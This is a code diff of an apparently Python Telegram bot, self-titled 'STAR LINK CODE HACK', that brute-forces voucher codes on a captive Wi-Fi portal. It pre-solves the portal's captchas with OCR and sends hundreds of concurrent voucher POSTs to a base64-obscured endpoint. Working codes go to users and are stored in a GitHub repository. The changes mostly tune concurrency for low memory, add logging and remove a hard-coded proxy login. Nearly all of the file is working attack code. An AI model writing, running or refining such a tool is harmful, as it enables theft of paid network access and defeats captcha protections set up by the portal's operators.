@@ -1,4 +1,4 @@
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, logging, gc, weakref
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
@@ -6,21 +6,46 @@ import cv2
 import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
+from collections import defaultdict
+import sys
+
+# ==================== LOGGING ====================
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+logger = logging.getLogger(__name__)
+
+# ==================== MEMORY LIMIT ====================
+# 1GB RAM — 85% threshold မှာ garbage collection force လုပ်
+MEMORY_THRESHOLD = 0.85  # 85% of available memory
+
+def check_memory():
+    """Check memory usage and force GC if needed."""
+    try:
+        import psutil
+        mem = psutil.virtual_memory()
+        if mem.percent > MEMORY_THRESHOLD * 100:
+            logger.warning(f"Memory high: {mem.percent}%. Forcing GC...")
+            gc.collect()
+            return mem.percent
+        return mem.percent
+    except ImportError:
+        # psutil မရှိရင် manual GC only
+        return 0
 
 # ==================== CONFIGURATION ====================
-# Railway Variables tab တွင် ထည့်ရမည်
 BOT_TOKEN    = os.environ.get("BOT_TOKEN",    "")
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
 REPO_NAME    = os.environ.get("REPO_NAME",    "")
 
-# Admin Telegram IDs — ဤနေရာတွင် တိုက်ရိုက်ထည့်ပါ
 ADMINS = [
     "1626617395",   # Admin 1 ID
     "",   # Admin 2 ID
 ]
 
-# Startup validation
 _missing = [k for k, v in {
     "BOT_TOKEN":    BOT_TOKEN,
     "GITHUB_TOKEN": GITHUB_TOKEN,
@@ -36,19 +61,14 @@ if _missing:
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-PROXY_LIST = [
-    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",
-]
+# ── Speed tuning — 1GB RAM optimized ─────────────────────
+VOUCHER_CONCURRENCY = 500    # 2000 → 500 (RAM ကန့်သတ်ချက်)
+CAPTCHA_POOL_SIZE   = 100    # 300 → 100
+CAPTCHA_SOLVERS     = 30     # 80 → 30
+BATCH_SIZE          = 500    # 2000 → 500
+MAX_CONCURRENT_SCANS = 5     # 20 → 5 (1GB အတွက်)
 
-_proxy_index = 0
-def get_next_proxy():
-    global _proxy_index
-    if not PROXY_LIST:
-        return None
-    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
-    _proxy_index += 1
-    return f"http://{proxy}"
-
+# ── Global state ──────────────────────────────────────────
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 user_data        = {}
@@ -57,30 +77,20 @@ success_messages = {}
 success_texts    = {}
 limited_messages = {}
 limited_texts    = {}
-captcha_state    = {}
-session          = None
-_connector       = None
-_start_time      = time.monotonic()
 
-# ── Speed tuning ──────────────────────────────────────────
-VOUCHER_CONCURRENCY = 2000   # voucher POST တပြိုင်နက်
-CAPTCHA_POOL_SIZE   = 300    # pre-solved captcha အရေအတွက်
-CAPTCHA_SOLVERS     = 80     # captcha တပြိုင်နက် solve လုပ်သောလုပ်သား
-BATCH_SIZE          = 2000   # တကြိမ်စစ်သော code အရေအတွက်
+# ── Per-scan captcha pools ────────────────────────────────
+_scan_pools = {}
+_scan_pools_lock = asyncio.Lock()
 
-# ── Captcha pool (per scan) ───────────────────────────────
-_captcha_pool  = None   # asyncio.Queue — pre-solved (session_id, auth_code) pairs
-_filler_task   = None   # background task
+session    = None
+_connector = None
+_start_time = time.monotonic()
 
-_voucher_sem   = None   # initialized in run_bruteforce
-_captcha_sem   = None   # initialized in run_bruteforce
-
-MAX_CONCURRENT_SCANS = 20
-active_scans_count   = 0
-active_scans_lock    = asyncio.Lock()
+active_scans_count = 0
+active_scans_lock  = asyncio.Lock()
 
 # ───────────────────────────────────────────────────────────
-# Web server (keep-alive / Railway PORT)
+# Web server
 # ───────────────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
@@ -93,6 +103,7 @@ async def web_server():
     port = int(os.environ.get('PORT', os.environ.get('BOT_PORT', 8099)))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
+    logger.info(f"Web server started on port {port}")
 
 # ───────────────────────────────────────────────────────────
 # GitHub helpers
@@ -205,7 +216,6 @@ async def callback_handler(call):
     user_id   = str(chat_id)
     user_name = call.from_user.first_name or call.from_user.username or "User"
 
-    # ── Back ──────────────────────────────────────────────
     if call.data == "menu_back":
         text = f"""✨ STAR LINK CODE HACK ✨
 
@@ -220,7 +230,6 @@ Menu မှ သင်လိုချင်တာကိုရွေးချယ�
         await bot.answer_callback_query(call.id)
         return
 
-    # ── Portal URL instructions ────────────────────────────
     if call.data == "menu_free_trial":
         text = """🔗 Portal URL ထည့်သွင်းရန်:
 
@@ -237,7 +246,6 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         await bot.answer_callback_query(call.id)
         return
 
-    # ── Start scan ────────────────────────────────────────
     if call.data == "menu_start_scam":
         global active_scans_count, active_scans_lock
         async with active_scans_lock:
@@ -290,7 +298,6 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
         scan_id      = str(uuid.uuid4())
 
-        # Notify admins (scan start)
         try:
             portal_url = user_data[chat_id].get('session_url', 'Unknown')
             last_url   = user_data[chat_id].get('last_admin_notified_url', '')
@@ -305,7 +312,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
                         pass
                 user_data[chat_id]['last_admin_notified_url'] = portal_url
         except Exception as e:
-            print(f"Admin notify error: {e}")
+            logger.error(f"Admin notify error: {e}")
 
         task = asyncio.create_task(
             run_bruteforce(
@@ -318,7 +325,6 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         await bot.answer_callback_query(call.id)
         return
 
-    # ── Results ───────────────────────────────────────────
     if call.data == "menu_result":
         results, _ = await get_file_content("result.json")
         if user_id in results and results[user_id]:
@@ -333,7 +339,6 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         await bot.answer_callback_query(call.id)
         return
 
-    # ── Recheck ───────────────────────────────────────────
     if call.data == "menu_recheck":
         if 'session_url' not in user_data.get(chat_id, {}):
             await bot.edit_message_text(
@@ -352,13 +357,11 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         await bot.answer_callback_query(call.id)
         return
 
-    # ── Stop ─────────────────────────────────────────────
     if call.data == "menu_stop":
         await stop_scan_command(call.message)
         await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
         return
 
-    # ── Select voucher mode ───────────────────────────────
     if call.data.startswith("scan_"):
         mode = call.data.replace("scan_", "")
 
@@ -394,7 +397,6 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         await bot.answer_callback_query(call.id)
         return
 
-    # ── Select start digit ────────────────────────────────
     if call.data.startswith("digit_"):
         parts = call.data.split("_")
         mode  = parts[1]
@@ -513,11 +515,10 @@ async def check_session_url_improved(session_url, use_proxy=False):
         'accept-language': 'en-US,en;q=0.9',
         'user-agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     }
-    proxy = get_next_proxy() if use_proxy else None
     try:
         async with session.get(
             session_url, allow_redirects=True, headers=headers,
-            proxy=proxy, timeout=15
+            timeout=15
         ) as response:
             if response.status >= 400:
                 return False
@@ -540,11 +541,11 @@ async def check_session_url_improved(session_url, use_proxy=False):
     except asyncio.TimeoutError:
         return False
     except Exception as e:
-        print(f"Portal check error: {e}")
+        logger.error(f"Portal check error: {e}")
         return False
 
 # ───────────────────────────────────────────────────────────
-# /scan  (command-based entry)
+# /scan
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['scan'])
 async def handle_key_scan(message):
@@ -588,7 +589,7 @@ async def handle_key_scan(message):
                     pass
             user_data[chat_id]['last_admin_notified_url'] = portal_url
     except Exception as e:
-        print(f"Admin notify error in /scan: {e}")
+        logger.error(f"Admin notify error in /scan: {e}")
 
     task = asyncio.create_task(
         run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'],
@@ -597,7 +598,7 @@ async def handle_key_scan(message):
     scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
 
 # ───────────────────────────────────────────────────────────
-# /status  (admin only)
+# /status
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['status'])
 async def status(message):
@@ -608,12 +609,16 @@ async def status(message):
     uptime_seconds = int(time.monotonic() - _start_time)
     hours, rem     = divmod(uptime_seconds, 3600)
     minutes, secs  = divmod(rem, 60)
+    pool_sizes = {sid[:8]: p["pool"].qsize() for sid, p in _scan_pools.items()}
+    mem_pct = check_memory()
     await bot.reply_to(
         message,
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {secs}s\n"
         f"🔍 Active Scans: {active_scans}\n"
-        f"👥 Sessions: {len(user_data)}"
+        f"👥 Sessions: {len(user_data)}\n"
+        f"🧩 Captcha Pools: {pool_sizes}\n"
+        f"💾 Memory: {mem_pct}%"
     )
 
 # ───────────────────────────────────────────────────────────
@@ -635,7 +640,7 @@ async def send_success_file(chat_id):
             if os.path.exists(filename):
                 os.remove(filename)
         except Exception as e:
-            print(f"send_success_file error: {e}")
+            logger.error(f"send_success_file error: {e}")
 
 @bot.message_handler(commands=['stop'])
 async def stop_scan_command(message):
@@ -674,11 +679,12 @@ async def github_update_scheduler():
                     if code not in results[uid]:
                         results[uid].append(code)
                 await update_file_content("result.json", results, sha, "Periodic Update")
+                logger.info(f"GitHub updated with {len(items)} codes")
             except Exception as e:
-                print(f"GitHub update error: {e}")
+                logger.error(f"GitHub update error: {e}")
 
 # ───────────────────────────────────────────────────────────
-# Code generators
+# Code generators — memory efficient
 # ───────────────────────────────────────────────────────────
 def digit_generator(length):
     return "".join(random.choice(string.digits) for _ in range(length))
@@ -693,6 +699,7 @@ def mixed_generator(length=6):
     return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
 
 def iter_codes(mode, start_digit=None):
+    """Generator — memory efficient, no large lists."""
     if mode in ["6", "7", "8", "9"]:
         length = int(mode)
         if start_digit is not None:
@@ -702,9 +709,29 @@ def iter_codes(mode, start_digit=None):
                 yield str(i).zfill(length)
             return
         if mode in ["6", "7", "8"]:
-            codes = [str(i).zfill(length) for i in range(10 ** length)]
-            random.shuffle(codes)
-            yield from codes
+            # Use iterator instead of list to save memory
+            # For 8-digit: 100M codes — can't fit in memory
+            # Use random sampling with deduplication via set (bounded)
+            if mode == "6":
+                # 1M codes — can fit in memory
+                codes = [str(i).zfill(length) for i in range(10 ** length)]
+                random.shuffle(codes)
+                yield from codes
+            else:
+                # 7-8 digits: random sampling without full list
+                seen = set()
+                total = 10 ** length
+                max_seen = min(total, 5_000_000)  # Cap at 5M in memory
+                while len(seen) < max_seen:
+                    code = digit_generator(length)
+                    if code not in seen:
+                        seen.add(code)
+                        yield code
+                # Then sequential for remaining
+                for i in range(total):
+                    code = str(i).zfill(length)
+                    if code not in seen:
+                        yield code
             return
         if mode == "9":
             while True:
@@ -757,11 +784,45 @@ def format_progress(checked, total=None, speed=0, found=0):
     )
 
 # ───────────────────────────────────────────────────────────
-# Brute-force runner
+# Per-scan captcha pool manager
+# ───────────────────────────────────────────────────────────
+async def create_scan_pool(scan_id, session_url, chat_id):
+    pool = asyncio.Queue(maxsize=CAPTCHA_POOL_SIZE)
+    sem  = asyncio.Semaphore(CAPTCHA_SOLVERS)
+    filler = asyncio.create_task(
+        _fill_captcha_pool(pool, session_url, scan_id, chat_id, sem)
+    )
+    async with _scan_pools_lock:
+        _scan_pools[scan_id] = {
+            "pool": pool,
+            "filler": filler,
+            "sem": sem,
+            "url": session_url,
+            "chat_id": chat_id,
+        }
+    return pool
+
+async def destroy_scan_pool(scan_id):
+    async with _scan_pools_lock:
+        entry = _scan_pools.pop(scan_id, None)
+    if entry:
+        entry["filler"].cancel()
+        try:
+            await entry["filler"]
+        except asyncio.CancelledError:
+            pass
+
+async def get_scan_pool(scan_id):
+    async with _scan_pools_lock:
+        entry = _scan_pools.get(scan_id)
+        return entry["pool"] if entry else None
+
+# ───────────────────────────────────────────────────────────
+# Brute-force runner — memory optimized
 # ───────────────────────────────────────────────────────────
 async def run_bruteforce(mode, chat_id, session_url, scan_id,
                          message=None, progress_msg=None, start_digit=None):
-    global _captcha_pool, _filler_task, _voucher_sem
+    global active_scans_count, active_scans_lock
 
     try:
         code_iter = iter_codes(mode, start_digit=start_digit)
@@ -771,18 +832,13 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
 
     total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
 
-    # ── Start captcha pool ───────────────────────────────
-    _captcha_pool = asyncio.Queue(maxsize=CAPTCHA_POOL_SIZE)
-    _filler_task  = asyncio.create_task(
-        _fill_captcha_pool(_captcha_pool, session_url, scan_id, chat_id)
-    )
+    pool = await create_scan_pool(scan_id, session_url, chat_id)
 
-    # Wait for pool to warm up (min 30 pre-solved captchas)
     warm_msg = await bot.send_message(
         chat_id, "⚡ Captcha Pool ပြင်ဆင်နေသည်... (3-5s)"
     )
-    for _ in range(60):
-        if _captcha_pool.qsize() >= 30:
+    for _ in range(100):
+        if pool.qsize() >= 20:  # Reduced warmup threshold
             break
         await asyncio.sleep(0.1)
     try:
@@ -790,9 +846,10 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
     except Exception:
         pass
 
-    _voucher_sem = asyncio.Semaphore(VOUCHER_CONCURRENCY)
+    voucher_sem = asyncio.Semaphore(VOUCHER_CONCURRENCY)
     checked      = 0
     scan_start   = time.monotonic()
+    last_gc      = time.monotonic()
 
     try:
         while True:
@@ -805,6 +862,11 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
                 success_texts.pop(chat_id, None)
                 return
 
+            # Periodic GC every 30 seconds
+            if time.monotonic() - last_gc > 30:
+                gc.collect()
+                last_gc = time.monotonic()
+
             batch = []
             for _ in range(BATCH_SIZE):
                 try:
@@ -815,9 +877,10 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
                 break
 
             async def _check(code):
-                async with _voucher_sem:
+                async with voucher_sem:
                     return await perform_check(
-                        session_url, code, chat_id, scan_id, message=message
+                        session_url, code, chat_id, scan_id,
+                        message=message, pool=pool
                     )
 
             await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
@@ -837,9 +900,8 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
                     new_msg = await bot.send_message(chat_id, text)
                     progress_msg.message_id = new_msg.message_id
                 except Exception as err:
-                    print(f"Progress error: {err}")
+                    logger.error(f"Progress error: {err}")
 
-        # Completed
         found       = len(success_texts.get(chat_id, []))
         finish_text = (
             f"🔍Scanning Completed\n\n"
@@ -856,22 +918,14 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
         await send_success_file(chat_id)
 
     finally:
-        # Stop captcha pool filler
-        if _filler_task and not _filler_task.done():
-            _filler_task.cancel()
-            try:
-                await _filler_task
-            except asyncio.CancelledError:
-                pass
-        _captcha_pool = None
-
+        await destroy_scan_pool(scan_id)
         await send_success_file(chat_id)
         scan_tasks.pop(chat_id, None)
         success_messages.pop(chat_id, None)
         success_texts.pop(chat_id, None)
         limited_messages.pop(chat_id, None)
         limited_texts.pop(chat_id, None)
-        global active_scans_count, active_scans_lock
+        gc.collect()  # Force GC after scan
         async with active_scans_lock:
             active_scans_count = max(0, active_scans_count - 1)
 
@@ -909,22 +963,20 @@ def _ocr_sync(image_bytes):
     img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
     if img is None:
         return None
-    # 2× upscale — OCR accuracy တိုးသည်
     img  = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
     gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    # Denoise
     gray = cv2.fastNlMeansDenoising(gray, h=10)
-    # Sharpen
     kernel = np.array([[0,-1,0],[-1,5,-1],[0,-1,0]])
     gray   = cv2.filter2D(gray, -1, kernel)
-    # Otsu threshold
     blur  = cv2.GaussianBlur(gray, (3, 3), 0)
     _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    # Morphological close — ကျိုးတဲ့ stroke ချိတ်ဆက်ရန်
     k  = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))
     th = cv2.morphologyEx(th, cv2.MORPH_CLOSE, k)
     _, bf = cv2.imencode('.png', th)
-    return _ocr.classification(bf.tobytes()).upper()
+    result = _ocr.classification(bf.tobytes()).upper()
+    # Explicit cleanup
+    del nparr, img, gray, blur, th, bf, kernel, k
+    return result
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
@@ -956,57 +1008,57 @@ async def Varify_Captcha(sess, session_id, text):
         json={'sessionId': session_id, 'authCode': text}
     ) as req:
         data = await req.json()
-        print(f"[Captcha] authCode={text} success={data.get('success')}")
         return session_id if data.get("success") else None
 
 # ───────────────────────────────────────────────────────────
-# Captcha pool — background pre-solver
+# Captcha pool filler
 # ───────────────────────────────────────────────────────────
-async def _solve_one_captcha(pool, session_url):
-    """Solve one captcha and push to pool."""
-    try:
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=15),
-        ) as ts:
-            sid = await get_session_id(ts, session_url)
-            if not sid: return
-            for _ in range(10):
-                try:
-                    img  = await Captcha_Image(ts, sid)
-                    text = await Captcha_Text(img)
-                    if text and await Varify_Captcha(ts, sid, text):
-                        try:
-                            pool.put_nowait((sid, text))
-                        except asyncio.QueueFull:
-                            pass
-                        return
-                except Exception:
-                    continue
-    except Exception:
-        pass
+async def _solve_one_captcha(pool, session_url, sem):
+    async with sem:
+        try:
+            async with aiohttp.ClientSession(
+                connector=_connector,
+                connector_owner=False,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=aiohttp.ClientTimeout(total=15),
+            ) as ts:
+                sid = await get_session_id(ts, session_url)
+                if not sid:
+                    return
+                for attempt in range(3):  # Reduced retries
+                    try:
+                        img  = await Captcha_Image(ts, sid)
+                        text = await Captcha_Text(img)
+                        if text and await Varify_Captcha(ts, sid, text):
+                            try:
+                                pool.put_nowait((sid, text))
+                            except asyncio.QueueFull:
+                                pass
+                            return
+                    except Exception:
+                        await asyncio.sleep(0.1)
+                        continue
+        except Exception:
+            pass
 
-async def _fill_captcha_pool(pool, session_url, scan_id, chat_id):
-    """Background task — keeps captcha pool full."""
-    global _captcha_sem
+async def _fill_captcha_pool(pool, session_url, scan_id, chat_id, sem):
     while True:
         cur = scan_tasks.get(chat_id)
         if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
             return
+
         needed = CAPTCHA_POOL_SIZE - pool.qsize()
         if needed > 0:
+            chunk = min(needed, 20)  # Smaller chunks
             tasks = [
-                asyncio.create_task(_solve_one_captcha(pool, session_url))
-                for _ in range(min(needed, CAPTCHA_SOLVERS))
+                asyncio.create_task(_solve_one_captcha(pool, session_url, sem))
+                for _ in range(chunk)
             ]
             await asyncio.gather(*tasks, return_exceptions=True)
         else:
-            await asyncio.sleep(0.05)
+            await asyncio.sleep(0.2)  # Longer sleep when full
 
 async def _solve_captcha_once(session_url):
-    """Solve one captcha on-demand (for recheck mode)."""
     async with aiohttp.ClientSession(
         connector=_connector,
         connector_owner=False,
@@ -1014,7 +1066,8 @@ async def _solve_captcha_once(session_url):
         timeout=aiohttp.ClientTimeout(total=20),
     ) as ts:
         sid = await get_session_id(ts, session_url)
-        if not sid: return None, None
+        if not sid:
+            return None, None
         for _ in range(10):
             try:
                 img  = await Captcha_Image(ts, sid)
@@ -1026,7 +1079,7 @@ async def _solve_captcha_once(session_url):
     return None, None
 
 # ───────────────────────────────────────────────────────────
-# Core voucher check  (pool-based — 1 HTTP request per code)
+# Core voucher check
 # ───────────────────────────────────────────────────────────
 POST_URL = base64.b64decode(
     b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
@@ -1042,29 +1095,26 @@ _VOUCHER_HEADERS = {
 }
 
 async def perform_check(session_url, code, chat_id, scan_id=None,
-                        recheck=False, message=None):
+                        recheck=False, message=None, pool=None):
     if not recheck:
         cur = scan_tasks.get(chat_id)
         if not cur or cur.get("scan_id") != scan_id:
             return
 
-    # ── Get captcha ──────────────────────────────────────
     if recheck:
-        # On-demand solve for recheck
         session_id, auth_code = await _solve_captcha_once(session_url)
         if not session_id:
             return
     else:
-        # Pull pre-solved captcha from pool (fast path)
-        pool = _captcha_pool
         if pool is None:
-            return
+            pool = await get_scan_pool(scan_id)
+            if pool is None:
+                return
         try:
             session_id, auth_code = await asyncio.wait_for(pool.get(), timeout=8.0)
         except asyncio.TimeoutError:
             return None
 
-    # ── Single voucher POST ──────────────────────────────
     response = None
     try:
         async with aiohttp.ClientSession(
@@ -1081,16 +1131,15 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
             ) as req:
                 response = await req.text()
     except Exception as e:
-        print(f"[voucher] {e}")
+        logger.debug(f"[voucher] {e}")
         return None
 
     if not response:
         return None
 
     if 'request limited' in response:
-        return None  # captcha pool filler ကသစ်ဖြည့်မည်
+        return None
 
-    # ── SUCCESS ──────────────────────────────────────────
     if 'logonUrl' in response:
         if recheck:
             return code
@@ -1128,9 +1177,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                         success_messages[chat_id]              = sent.message_id
                         user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
             except Exception as e:
-                print(f"Success message error: {e}")
+                logger.error(f"Success message error: {e}")
 
-    # ── LIMITED ──────────────────────────────────────────
     elif 'STA' in response:
         limited_texts.setdefault(chat_id, []).append(code)
         limited_line = "\n".join(limited_texts[chat_id])
@@ -1150,7 +1198,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                         sent = await bot.send_message(message.chat.id, f"Limited Codes:\n\n{limited_line}")
                         limited_messages[chat_id] = sent.message_id
             except Exception as e:
-                print(f"Limited message error: {e}")
+                logger.error(f"Limited message error: {e}")
 
 # ───────────────────────────────────────────────────────────
 # Balance / expiry helpers
@@ -1201,47 +1249,79 @@ async def Code_Expires_Date(active_id):
                             totaltime  = Minute_to_Hour(raw_mins)
                             return f"📋 Plan: {profile} | ⏳ Time: {totaltime}", raw_mins
             except Exception as e:
-                print(f"[Code_Expires_Date] {e}")
+                logger.debug(f"[Code_Expires_Date] {e}")
     return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'
 
 # ───────────────────────────────────────────────────────────
-# Polling  (timeout fix — request_timeout > timeout)
+# Polling with watchdog
 # ───────────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
     while True:
         try:
             await bot.infinity_polling(
-                timeout=45,          # long-poll wait (Telegram holds connection)
-                request_timeout=55,  # aiohttp timeout — MUST be > timeout
+                timeout=45,
+                request_timeout=55,
                 interval=0,
             )
             return
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
+            logger.warning(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
-            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
+            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
+
+# ───────────────────────────────────────────────────────────
+# Watchdog — memory + health monitor
+# ───────────────────────────────────────────────────────────
+async def scan_watchdog():
+    while True:
+        await asyncio.sleep(60)
+        try:
+            active = sum(1 for d in scan_tasks.values() if not d["task"].done())
+            pools = {sid[:8]: p["pool"].qsize() for sid, p in _scan_pools.items()}
+            mem_pct = check_memory()
+            
+            # Force GC if memory > 85%
+            if mem_pct > 85:
+                logger.warning(f"High memory: {mem_pct}%. Forcing GC...")
+                gc.collect()
+            
+            if active > 0:
+                logger.info(f"Health: {active} scans, pools: {pools}, mem: {mem_pct}%")
+        except Exception as e:
+            logger.error(f"Watchdog error: {e}")
 
 # ───────────────────────────────────────────────────────────
 # Main
 # ───────────────────────────────────────────────────────────
 async def main():
     global session, _connector
+    
+    # Memory-optimized connector
     _connector = aiohttp.TCPConnector(
-        limit=20000, limit_per_host=10000,
-        ttl_dns_cache=300, ssl=False
+        limit=2000,           # 20000 → 2000
+        limit_per_host=1000,  # 10000 → 1000
+        ttl_dns_cache=300,
+        ssl=False,
+        keepalive_timeout=30,
+        enable_cleanup_closed=True,
     )
     session = aiohttp.ClientSession(
         timeout=aiohttp.ClientTimeout(total=30),
         connector=_connector, connector_owner=False
     )
+    
+    # Force GC at startup
+    gc.collect()
+    
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
+        asyncio.create_task(scan_watchdog())
         await start_polling()
     finally:
         await session.close()
